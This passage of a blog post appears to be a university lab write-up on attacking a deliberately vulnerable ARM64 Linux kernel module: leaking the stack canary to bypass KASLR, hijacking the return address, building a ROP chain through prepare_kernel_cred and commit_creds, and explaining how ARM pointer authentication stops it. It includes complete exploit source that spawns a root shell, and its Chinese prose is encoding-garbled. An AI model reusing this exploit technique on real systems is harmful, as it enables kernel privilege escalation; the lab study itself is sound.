cmd.length = len; if(cmd.length \u0026gt; 16) cmd.length = 16; memcpy(cmd.command, buffer, len); memcpy(prev_cmd,cmd.command, cmd.length); printk(\u0026#34;cmd :%s len:%ld\\n\u0026#34;, cmd.command,len); return 0; } ssize_t zjubof_write3(char *buffer,size_t len) { printk(\u0026#34;zjubof_write3\\n\u0026#34;); zjubof_write4(buffer, len); return 0; } å‡½æ•°è°ƒç”¨æ ˆå¦‚ä¸‹æ‰€ç¤ºï¼š\nè§¦å‘buffer overflowçš„æ ¸å¿ƒåœ¨äºï¼š 1 2 3 4 5 6 if(cmd.length \u0026gt; 16) cmd.length = 16; // å°½ç®¡ç¨‹åºå¯¹äºcmd.lengthä½œå‡ºäº†é™åˆ¶ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰å¯¹lenè¿›è¡Œé™åˆ¶ memcpy(cmd.command, buffer, len); // é€šè¿‡bufferè¦†ç›–cmd.length // æ­¤æ—¶cmd.lengthè¢«ä¿®æ”¹ï¼Œprev_cmdå¯ä»¥è¯»å–åˆ°canary/lrä¿¡æ¯ memcpy(prev_cmd,cmd.command, cmd.length); å› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ bufferå¦‚ä¸‹ï¼š\nbuf[49] = \u0026quot;0123456789ABCDEF\\x30\u0026quot;ï¼Œ49 = 48 + 1,48ä¸ºéœ€è¦æ³„éœ²çš„å­—èŠ‚æ•°ï¼Œ1ä¸ºbufæœ«å°¾çš„\\0\nè¿›è€Œæˆ‘ä»¬å¯ä»¥æ³„éœ²canary/lr/oldfpï¼Œç”±äºlr(ra)ä¿å­˜çš„æ˜¯zjubof_write2ä¸­è°ƒç”¨zjubof_write3ä¹‹åçš„è¿”å›åœ°å€ï¼Œåæ±‡ç¼–zjubof_write2å¾—åˆ°æ— åç§»çš„RAï¼Œå†ä¸å¼€å¯KASLRçš„lr(ra)ç›¸å‡å³å¯å¾—åˆ°åç§» å…³é”®ä»£ç å¦‚ä¸‹:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 const size_t RAWithoutKASLR = 0xffff800010de7d0c; char canaryStr[8]; // canary char oldFPStr[8]; // fp of zjubof_write2 char oldRAStr[8]; // ra of zjubof_write3 -\u0026gt; zjubof_write2 size_t getOffset(int fd) { size_t len = 0; char buf[49] = \u0026#34;0123456789ABCDEF\\x30\u0026#34;; // cmd.command = \u0026#34;0123456789ABCDEF\u0026#34;, cmd.length = 0x30 len = write(fd, buf, 24); // // 16 + 8 B len = read(fd, buf, 48); // CMD_LENGTH = 49, len \u0026lt; 49 memset(canaryStr, \u0026#39;\\0\u0026#39;, sizeof(canaryStr)); memcpy(canaryStr, buf+24, 8); memset(oldFPStr, \u0026#39;\\0\u0026#39;, sizeof(oldFPStr)); memcpy(oldFPStr, buf+32, 8); memset(oldRAStr, \u0026#39;\\0\u0026#39;, sizeof(oldRAStr)); memcpy(oldRAStr, buf+40, 8); size_t canary = *(size_t *) canaryStr; size_t oldFP = *(size_t *) oldFPStr; size_t oldRA = *(size_t *) oldRAStr; size_t offset = oldRA - RAWithoutKASLR; return offset; } ç»“æœ è‡³æ­¤ï¼Œæˆ‘ä»¬æˆåŠŸæ³„éœ²äº†canaryå’Œoffsetï¼Œä¹‹åå°±å¯ä»¥é€šè¿‡åç§»é‡ç»•è¿‡KASLR\nTask2: ä¿®æ”¹return addressï¼Œè·å– root æƒé™ Task2è¦æ±‚æˆ‘ä»¬ä¿®æ”¹raï¼Œè·³è½¬åˆ°first_level_gadgetï¼Œç”±first_level_gadgetå®ç°ææƒï¼›æˆ‘ä»¬å…ˆåæ±‡ç¼–ä¸€ä¸‹first_level_gadgetï¼Œå‘ç°ç¬¬ä¸€è¡Œä»£ç ä¿®æ”¹äº†spï¼Œè€Œä¿®æ”¹raåè¿”å›æ—¶ï¼Œspå·²ç»è¢«è®¾ç½®å¥½äº†ï¼Œå¦‚æœæ­¤æ—¶è·³è½¬åˆ°ç¬¬ä¸€è¡Œï¼Œspå†æ¬¡è¢«ä¿®æ”¹ï¼Œå°±ä¼šå¯¼è‡´æ ˆç©ºé—´å‡ºé”™ï¼Œè¿›è€Œå¯¼è‡´ç¨‹åºå‡ºé”™ï¼Œå› æ­¤éœ€è¦è·³åˆ°ç¬¬äºŒè¡Œ åˆ†æå‡½æ•°è°ƒç”¨æ—¶spçš„å˜åŒ– zjubof_write call zjubof_write2: 1 2 3 sp = sp - 220 # ... sp = sp + 220 zjubof_write2 call zjubof_write3: 1 2 3 sp = sp - 32 # ... sp = sp + 32 zjubof_write3 call zjubof_write4: 1 2 3 sp = sp - 80 # ... sp = sp + 80 å½“æˆ‘ä»¬è¦†ç›–è¿”å›åœ°å€è·³è½¬åˆ°first_level_gadgetæ—¶ï¼Œsp+80å’Œsp+32å·²ç»è¢«æ‰§è¡Œï¼Œæ­¤æ—¶çš„sp[0]å’Œsp[8]åˆ†åˆ«æŒ‡å‘zjubof_writeçš„oldfp(x29)å’Œra(x30)ï¼Œåœ¨first_level_gadgetä¸­æ— éœ€å†å°†x29å’Œx30å‹æ ˆï¼ŒåŒæ—¶ä¸ºäº†åœ¨first_level_gadgetæ‰§è¡Œå®Œåèƒ½å¤Ÿæ­£ç¡®è¿”å›åˆ°zjubof_writeï¼Œéœ€è¦æ‰‹åŠ¨æ·»åŠ æŒ‡ä»¤å°†sp+220\nåˆ†æå¾—åˆ°æ ˆç©ºé—´å¦‚ä¸‹ï¼Œå¹¶æ„é€ buffer bufferçš„å‰24å­—èŠ‚å’ŒTask1æ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯éœ€è¦å°†Task1ä¸­å¾—åˆ°çš„canary/oldfpå¡«å…¥bufferçš„24-40å­—èŠ‚ï¼Œç„¶åå°†æ–°çš„è¿”å›åœ°å€å¡«å…¥40-48å­—èŠ‚\nå…³é”®ä»£ç åŠç»“æœ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 void hackUsingFirstLevelGadget(int fd, size_t offset) { char buf[49] = \u0026#34;0123456789ABCDEF\\x30\u0026#34;; size_t newRA = RAToFirstLevelGadget + offset; memcpy(buf + 24, canaryStr, 8); memcpy(buf + 32, oldFPStr, 8); memcpy(buf + 40, (char*)\u0026amp;newRA, 8); write(fd, buf, 48); system(\u0026#34;/bin/sh\u0026#34;); return; } flagï¼šsysde655sEc\nTask3: ROP è·å– root æƒé™ è¿™æ¬¡æˆ‘ä»¬éœ€è¦ä½¿ç”¨ROPè¿›è¡Œææƒï¼Œå‡½æ•°è°ƒç”¨æ ˆä¸º 1 2 3 4 5 6 7 8 9 zjubof_write4 -\u0026gt; zjubof_write3-\u0026gt;prepare_kernel_cred-\u0026gt;commit_creds-\u0026gt;second_level_gadget into zjubof_write3: sp = sp - 32 leave zjubof_write3: sp = sp + 32 into prepare_kernel_cred: sp = sp - 32 leave prepare_kernel_cred: sp = sp + 32 into commit_creds: sp = sp - 48 leave commit_creds: sp = sp + 48 into second_level_gadget: sp = sp leave second_level_gadget: sp = sp + 464 æ ¹æ®å‡½æ•°è°ƒç”¨æ ˆï¼Œå¾—åˆ°æ ˆå¸ƒå±€ æ„é€ bufferå¦‚ä¸‹ 1 2 3 4 5 6 buf.length = 160 + 1 (160 B + \u0026#39;\\0\u0026#39;) buf[24 ... 30] = canary buf[40 ... 48] = RA of prepare_kernel_cred buf[72 ... 80] = RA of commit_creds buf[104 ... 112] = RA of second_level_gadget buf[152 ... 160] = RA of zjubof_write å„ä¸ªROPçš„è·³è½¬åœ°å€åˆ†åˆ«ä¸ºï¼š\nRA of prepare_kernel_cred: 0xffff8000100a6214\nRA of commit_creds: 0xffff8000100a5f6c\nRA of second_level_gadget: 0xffff8000107abdb0ï¼ˆå› ä¸ºç¬¬ä¸€æ¡æŒ‡ä»¤ä¸æ”¹å˜spï¼Œå› æ­¤å¯ä»¥ç›´æ¥è·³ ï¼‰\nRA of zjubof_write: 0xffff8000107abe54\nå…³é”®ä»£ç åŠç»“æœ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 void hackUsingROP(int fd, size_t offset) { char buf[161]; memset(buf, \u0026#39;\\0\u0026#39;, sizeof(buf)); memcpy(buf + 24, canaryStr, 8); size_t prepareKernelCredRA = RAOfPrepareKernelCred + offset; memcpy(buf + 40, (char*)\u0026amp;prepareKernelCredRA, 8); size_t commitCredsRA = RAOfCommitCreds + offset; memcpy(buf + 72, (char*)\u0026amp;commitCredsRA, 8); size_t secondLevelGadgetRA = RAOfSecondLevelGadget + offset; memcpy(buf + 104, (char*)\u0026amp;secondLevelGadgetRA, 8); size_t ZJUBofWriteRA = RAOfZJUBofWrite + offset; memcpy(buf + 152, (char*)\u0026amp;ZJUBofWriteRA, 8); write(fd, buf, 160); system(\u0026#34;/bin/sh\u0026#34;); return; } flagï¼šsysde655sEc\nTask4: Linuxå†…æ ¸å¯¹ ROP æ”»å‡»çš„é˜²æŠ¤ ç¼–è¯‘è¿è¡Œï¼Œä¹‹åæ‰§è¡Œexp 1 2 3 4 5 6 7 8 # ç¼–è¯‘å†…æ ¸ export ARCH=arm64 make CROSS_COMPILE=aarch64-linux-gnu- defconfig make CROSS_COMPILE=aarch64-linux-gnu- menuconfig make CROSS_COMPILE=aarch64-linux-gnu- -j$(nproc) # å°†vmlinuxç²¾ç®€æˆImage aarch64-linux-gnu-objcopy -O binary vmlinux Image --strip-all ./start.sh å‘ç°å‡ºç°æ®µé”™è¯¯\næŸ¥çœ‹æ±‡ç¼–ä»£ç ï¼Œå‘ç°ç›¸æ¯”ä¹‹å‰å¤šäº†paciaspå’Œautiaspè¿™ä¸¤ä¸ªæŒ‡ä»¤ è¿™ä¸¤ä¸ªæŒ‡ä»¤ç”±ARM PAæœºåˆ¶å¼•å…¥ï¼Œè¿™æ˜¯ä¸€ç§æŒ‡é’ˆè®¤è¯çš„æ–¹å¼ã€‚å…¶é€šè¿‡åœ¨å­˜å‚¨æŒ‡é’ˆä¹‹å‰å‘æœªä½¿ç”¨çš„é«˜ä½æ·»åŠ åŠ å¯†ç­¾åæ¥å·¥ä½œï¼Œè¿™ä¹Ÿè¢«ç§°ä¸ºæŒ‡é’ˆè®¤è¯ç ï¼ˆPACï¼‰ã€‚paciaspç”¨äºåœ¨å­˜å‚¨æŒ‡é’ˆå€¼ä¹‹å‰ç”Ÿæˆå¹¶æ’å…¥æŒ‡é’ˆè®¤è¯ä»£ç ï¼ˆPACï¼‰ï¼Œè€Œautiaspåˆ™ç”¨äºåœ¨ä»å†…å­˜è¯»å›åéªŒè¯å¹¶åˆ é™¤æŒ‡é’ˆå€¼ä¸­çš„PACã€‚è¿™ç§æœºåˆ¶å¯ä»¥ä¿è¯åœ¨å†™å…¥å’Œè¯»å–æŒ‡é’ˆä¹‹é—´å¯¹æŒ‡é’ˆå€¼çš„ä»»ä½•æ›´æ”¹éƒ½ä¼šä½¿ç­¾åæ— æ•ˆï¼Œè¿›è€ŒCPUä¼šå°†èº«ä»½éªŒè¯å¤±è´¥è§£é‡Šä¸ºå†…å­˜æŸåï¼Œå¹¶è®¾ç½®æŒ‡é’ˆä¸­çš„é«˜ä½ï¼Œä½¿è¯¥æŒ‡é’ˆæ— æ•ˆå¹¶å¯¼è‡´åº”ç”¨ç¨‹åºå´©æºƒã€‚\næ€»ç»“æ¥è¯´ï¼Œåœ¨è¿›å…¥å‡½æ•°çš„æ—¶å€™ï¼Œæ ˆä¸Šå­˜å‚¨çš„ä¸å†æ˜¯è¿”å›åœ°å€ï¼Œè€Œæ˜¯é™„å¸¦ç€åŠ å¯†åçš„è¿”å›åœ°å€ï¼Œåœ¨ç¦»å¼€å‡½æ•°æ—¶ä¼šæ ¡éªŒè¿™ä¸ªåœ°å€çš„åˆæ³•æ€§ï¼Œå¦‚æœåˆæ³•å³æœªè¢«ç¯¡æ”¹å‡½æ•°æ‰èƒ½æ­£å¸¸è¿”å›ï¼›åŒæ—¶ç”±äºæ”»å‡»è€…æ— æ³•å¾—çŸ¥å¯†é’¥ä»¥åŠåŠ å¯†ç®—æ³•ï¼Œå› æ­¤æ”»å‡»è€…æ— æ³•æ„é€ å‡ºåŠ å¯†åçš„è¿”å›åœ°å€è¿›è¡Œbuffer overflowï¼Œä¹Ÿå°±æ— æ³•è¿›è¡Œ ROP æ”»å‡»\næ€è€ƒé¢˜ ä¸ºä»€ä¹ˆlinux canaryçš„æœ€ä½ä½byteæ€»æ˜¯ \\00ï¼Ÿ ä¿è¯å†…å­˜å¯¹é½ï¼Œå¯ä»¥æé«˜å†…å­˜è®¿é—®æ•ˆç‡ï¼›åŒæ—¶å¯ä»¥å°†å…¶å½“åšå­—ç¬¦ä¸²çš„ç»ˆæ­¢ç¬¦ï¼Œé˜²æ­¢canaryçš„æ³„éœ²\nåœ¨ARM64çš„ROPä¸­ï¼Œåœ¨ zjubof_write4ä¸­overflowè¦†ç›–åˆ°çš„è¿”å›åœ°å€ï¼Œä¼šåœ¨ ä»€ä¹ˆæ—¶å€™/æ‰§è¡Œåˆ°å“ªä¸ªå‡½æ•°å“ªä¸€è¡Œçš„æ—¶å€™è¢«loadåˆ°pcå¯„å­˜å™¨ï¼Ÿ ä¼šåœ¨zjubof_write3çš„return 0;ï¼Œä¹Ÿå°±æ˜¯åœ¨zjubof_write3æ±‡ç¼–çš„ldp x29, x30, [sp], #32è¡Œï¼Œx29å’Œx30è¢«æ›´æ–°ï¼Œç„¶åæ‰§è¡Œretæ—¶loadåˆ°pcå¯„å­˜å™¨\nåœ¨Task2ä¸­ï¼Œä¸ºä»€ä¹ˆåœ¨expä¸­ç›´æ¥è¦†ç›–è¿”å›åœ°å€ä¸º first_level_gadget çš„æ±‡ç¼–ç¬¬ä¸€è¡Œåœ°å€ï¼Œä¼šé€ æˆkernelåœ¨è¿è¡Œåˆ°è¿™ä¸€è¡Œçš„æ—¶å€™äº§ç”Ÿpanicï¼Ÿå¹¶å†™å‡ºé€ æˆè¿™ä¸ªpanicçš„è§¦å‘é“¾ å½“è·³è½¬åˆ°first_level_gadgetä¸”å°šæœªæ‰§è¡Œå…¶ä¸­çš„æ±‡ç¼–æ—¶ï¼Œæ ˆç©ºé—´å¦‚ä¸‹æ‰€ç¤º\næ­¤æ—¶zjubof_write3å’Œzjubof_write4éƒ¨åˆ†çš„æ ˆç©ºé—´å·²ç»è¢«é‡Šæ”¾ï¼Œå¯ä»¥çœ‹åˆ°spå·²ç»æŒ‡å‘äº†æ ˆåº•ï¼ŒåŒæ—¶x29å’Œx30å¯„å­˜å™¨çš„å€¼å·²ç»æ˜¯è¢«æ­£ç¡®å‹æ ˆäº†ï¼Œæ­¤æ—¶æˆ‘ä»¬å¦‚æœè·³åˆ°ç¬¬ä¸€è¡Œï¼Œåˆ™åˆä¼šå°†x29å’Œx30å‹æ ˆï¼Œè€Œæ­¤æ—¶çš„x29å’Œx30å¯„å­˜å™¨ä¿å­˜çš„æ˜¯first_level_gadgetçš„ä¸­çš„è¿”å›åœ°å€å’Œæ—§æ ˆå¸§ï¼Œä¹Ÿå°±æ˜¯ä¸‹é¢è¿™æ ·\nå½“first_level_gadgetæ‰§è¡Œå®Œæˆåï¼Œä¼šé¦–å…ˆæ›´æ–°x29å’Œx30ï¼Œæ­£å¸¸æƒ…å†µä¸‹ä¼šè·³å›zjubof_write1ï¼Œå¹¶å°†sp+220è¿›è€Œæ¢å¤spï¼Œè€Œç°åœ¨åˆ™ä¼šå†æ¬¡è·³åˆ°first_level_gadgetï¼ŒåŒæ—¶sp+220ä¹Ÿä¼šæ›´æ–°åˆ°é”™è¯¯çš„åœ°æ–¹ï¼Œä¹‹åå°±æ˜¯é‡å¤çš„å†æ¬¡è·³åˆ°first_level_gadgetï¼ŒåŒæ—¶sp+220é”™è¯¯çš„æ›´æ–°ï¼Œç›´åˆ°stack overflow\nLinux å†…æ ¸æ˜¯å¦‚ä½•åˆ©ç”¨ ARM PA æ¥é˜²å¾¡ ROP æ”»å‡»çš„ è§Task4ä¸­çš„åˆ†æ\né™„exp.cå®Œæ•´ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; const size_t RAWithoutKASLR = 0xffff800010de7d0c; const size_t RAToFirstLevelGadget = 0xffff8000107abd7c; const size_t RAOfPrepareKernelCred = 0xffff8000100a6214; const size_t RAOfCommitCreds = 0xffff8000100a5f6c; const size_t RAOfSecondLevelGadget = 0xffff8000107abdb0; const size_t RAOfZJUBofWrite = 0xffff8000107abe54; char canaryStr[8]; char oldFPStr[8]; // fp of zjubof_write2 char oldRAStr[8]; // ra of zjubof_write3 -\u0026gt; zjubof_write2 size_t getOffset(int fd) { size_t len = 0; char buf[49] = \u0026#34;0123456789ABCDEF\\x30\u0026#34;; // cmd.command = \u0026#34;0123456789ABCDEF\u0026#34;, cmd.length = 0x30 len = write(fd, buf, 24); // // 16 + 8 B len = read(fd, buf, 48); // CMD_LENGTH = 49, len \u0026lt; 49 memset(canaryStr, \u0026#39;\\0\u0026#39;, sizeof(canaryStr)); memcpy(canaryStr, buf+24, 8); memset(oldFPStr, \u0026#39;\\0\u0026#39;, sizeof(oldFPStr)); memcpy(oldFPStr, buf+32, 8); memset(oldRAStr, \u0026#39;\\0\u0026#39;, sizeof(oldRAStr)); memcpy(oldRAStr, buf+40, 8); size_t canary = *(size_t *) canaryStr; size_t oldFP = *(size_t *) oldFPStr; size_t oldRA = *(size_t *) oldRAStr; printf(\u0026#34;canary = 0x%lx\\n\u0026#34;, canary); printf(\u0026#34;oldFP = 0x%lx\\n\u0026#34;, oldFP); printf(\u0026#34;oldRA = 0x%lx\\n\u0026#34;, oldRA); size_t offset = oldRA - RAWithoutKASLR; printf(\u0026#34;offset = 0x%lx\\n\u0026#34;, offset); return offset; } void hackUsingFirstLevelGadget(int fd, size_t offset) { char buf[49] = \u0026#34;0123456789ABCDEF\\x30\u0026#34;; size_t newRA = RAToFirstLevelGadget + offset; memcpy(buf + 24, canaryStr, 8); memcpy(buf + 32, oldFPStr, 8); memcpy(buf + 40, (char*)\u0026amp;newRA, 8); write(fd, buf, 48); system(\u0026#34;/bin/sh\u0026#34;); return; } void hackUsingROP(int fd, size_t offset) { char buf[161]; memset(buf, \u0026#39;\\0\u0026#39;, sizeof(buf)); memcpy(buf + 24, canaryStr, 8); size_t prepareKernelCredRA = RAOfPrepareKernelCred + offset; memcpy(buf + 40, (char*)\u0026amp;prepareKernelCredRA, 8); size_t commitCredsRA = RAOfCommitCreds + offset; memcpy(buf + 72, (char*)\u0026amp;commitCredsRA, 8); size_t secondLevelGadgetRA = RAOfSecondLevelGadget + offset; memcpy(buf + 104, (char*)\u0026amp;secondLevelGadgetRA, 8); size_t ZJUBofWriteRA = RAOfZJUBofWrite + offset; memcpy(buf + 152, (char*)\u0026amp;ZJUBofWriteRA, 8); write(fd, buf, 160); system(\u0026#34;/bin/sh\u0026#34;); return; } int main(int argc, char *argv[]) { int fd = open(\u0026#34;/dev/zjubof\u0026#34;, O_RDWR); size_t offset = getOffset(fd); hackUsingFirstLevelGadget(fd, offset); // hackUsingROP(fd, offset); return 0; } Written by Jiacheng Hu, at Zhejiang University, Hangzhou, China.\n","date":"2023-06-07T22:50:00Z","image":"https://unicocn.github.io/p/rop/cover_hu5b167a362bf183fa776f2ef90b695ed1_16596_120x120_fill_q75_box_smart1.jpg","permalink":"https://unicocn.github.io/p/rop/","title":"ROP | Linuxå†…æ ¸æ”»é˜²"}]